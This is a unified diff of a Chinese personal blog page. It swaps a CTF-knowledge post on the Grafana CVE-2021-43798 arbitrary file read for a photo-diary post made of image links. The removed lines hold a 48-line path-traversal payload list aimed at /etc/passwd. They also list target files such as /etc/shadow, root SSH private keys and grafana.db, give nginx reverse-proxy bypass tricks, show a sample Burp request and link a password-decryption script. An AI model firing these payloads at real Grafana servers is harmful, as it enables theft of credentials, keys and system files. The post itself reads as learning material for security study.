@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            Grafano框架漏洞总结
+            无规则拍照
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -36,25 +36,25 @@
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">Grafano框架漏洞总结</h1>
+                <h1 class="header-subtitle">无规则拍照</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2022-09-25
+                            <i class="iconfont icon-time"></i> 发表时间：2022-10-17
                         </span>
                         
-                            <span id="/2022/09/25/grafano框架漏洞总结/" class="leancloud_visitors" data-flag-title="Grafano框架漏洞总结">
+                            <span id="/2022/10/17/浅浅的摄影一下/" class="leancloud_visitors" data-flag-title="无规则拍照">
                                 <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                             </span>
                         
                         <span>
-                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/09/25/grafano框架漏洞总结/"></span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/10/17/浅浅的摄影一下/"></span>
                         </span>  
                     </p>
                     
                     
                         
-                            <span class="tag-color">ctfknowledge</span>
+                            <span class="tag-color">girlfriend摄影日记</span>
                         
                     
                 </div>
@@ -69,26 +69,18 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h1 id="Grafana框架任意文件读取的漏洞"><a href="#Grafana框架任意文件读取的漏洞" class="headerlink" title="Grafana框架任意文件读取的漏洞"></a>Grafana框架任意文件读取的漏洞</h1><p>版本8.0.0到8.3.0</p>
-<ol>
-<li><p>漏洞测试字典</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertmanager/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/canvas/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashboard/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/debug/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/live/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mixed/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/xychart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可利用文件位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/conf/defaults.ini</span><br><span class="line">/etc/grafana/grafana.ini</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/home/grafana/.bash_history</span><br><span class="line">/home/grafana/.ssh/id_rsa</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/usr/local/etc/grafana/grafana.ini</span><br><span class="line">/var/lib/grafana/grafana.db</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/self/cmdline</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/jas502n/Grafana-CVE-2021-43798"><u>利用secre_key和data_source password破解密码的go脚本</u><a><br><a target="_blank" rel="noopener" href="https://golang.google.cn/play/"><u>golang官网的在线编辑器</u></a>(可以直接在官网的这个编辑器跑go脚本)</p>
-</li>
-</ol>
-<h3 id="Grafana框架踩过的坑"><a href="#Grafana框架踩过的坑" class="headerlink" title="Grafana框架踩过的坑"></a>Grafana框架踩过的坑</h3><p>第一次就是直接从url里面，执行任意文件读取，没有编码，导致一直无法读取任意文件<br><code>/public/plugins/text/../..%2f..%2f···</code></p>
-<p>第二次就是因为目前已经部署的 Grafana 会有很多被 nginx&#x2F;apache 等中间件反向代理的情况,有的中间件的 URI_normalization 机制导致 URL 被标准化。<br>所以需要绕过nginx反代理(需要家<code>/#/</code>绕过)<br><code>/public/plugins/text/#/../../../../../../../../etc/passwd</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># proxy_grafana.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen         8081;</span><br><span class="line">    server_name    127.0.0.1;</span><br><span class="line">    charset        utf-8;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.1.100:3000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># BurpSuite</span><br><span class="line"></span><br><span class="line">GET /public/plugins/text/#/../../../../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">User-Agent: CVE-2021-43798</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-<p>当 proxy_pass 的 url 结尾加 &#x2F; 时:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># proxy_grafana.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen         8081;</span><br><span class="line">    server_name    127.0.0.1;</span><br><span class="line">    charset        utf-8;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.1.100:3000/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果 proxy_pass 带 &#x2F;<br>标准化请求的 URI<br>将标准化后的 URI 中与 location 相同的部分移除<br>剩下的URI片段，拼接到 proxy_pass 指令中的 URI<br>如果 proxy_pass 不带 &#x2F;<br>如果原始请求被处理过（所谓的处理，应该是指对URI进行标准化处理），则原始请求URI被发送给服务器<br>在处理改变后的URI时，完整的标准化后的请求URI被发送给服务器<br>故当 nginx 反代为以下配置均可绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">      proxy_pass http://192.168.1.100:3000;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p><code>     location / &#123;         proxy_pass http://192.168.1.100:3000$request_uri;     &#125;</code></p>
+                <h4 id="2022-07-14"><a href="#2022-07-14" class="headerlink" title="2022-07-14"></a>2022-07-14</h4><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720220714224031.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720220714224027.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720220714223940.jpg"></p>
+<h4 id="2022-10-17"><a href="#2022-10-17" class="headerlink" title="2022-10-17"></a>2022-10-17</h4><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017201922.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017201950.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017201955.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017202141.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017202104.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017202102.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017201957.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017202107.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/QQ%E5%9B%BE%E7%89%8720221017202000.jpg"></p>
 
                 
                 <p class="end">__END__</p>
@@ -101,7 +93,7 @@
     <div class="suffix-box-right">
         <span class="suffix-box-title">文章作者：</span>懒羊羊
         <br>
-        <span class="suffix-box-title">文章出处：</span><a href="/2022/09/25/grafano%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank">Grafano框架漏洞总结</a>
+        <span class="suffix-box-title">文章出处：</span><a href="/2022/10/17/%E6%B5%85%E6%B5%85%E7%9A%84%E6%91%84%E5%BD%B1%E4%B8%80%E4%B8%8B/" target="_blank">无规则拍照</a>
         <br>
         <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
         <br>
@@ -117,17 +109,14 @@
                     <div class="tag">
                         标签：
                         
-                            <a href="/tags/ctfknowledge/">ctfknowledge</a>
+                            <a href="/tags/girlfriend%E6%91%84%E5%BD%B1%E6%97%A5%E8%AE%B0/">girlfriend摄影日记</a>
                         
                     </div>
                 
                 <div class="article-prev-next">
                     
-                        <a href="/2022/10/09/sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/" class="prev-prefix">« </a> 上一篇：    <a href="/2022/10/09/sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/" title="发布于 2022-10-09 08:18">sql注入测试方法.md</a>
-                        <br>
                     
-                    
-                        <a href="/2022/09/22/buu-MRCTF2020%E5%A5%97%E5%A8%83/" class="next-prefix">» </a> 下一篇：    <a href="/2022/09/22/buu-MRCTF2020%E5%A5%97%E5%A8%83/" title="发布于 2022-09-22 09:17">buu MRCTF2020套娃</a>
+                        <a href="/2022/10/16/ssti%E6%A8%A1%E6%9D%BF/" class="next-prefix">» </a> 下一篇：    <a href="/2022/10/16/ssti%E6%A8%A1%E6%9D%BF/" title="发布于 2022-10-16 08:50">ssti模板</a>
                     
                 </div>
             </div>
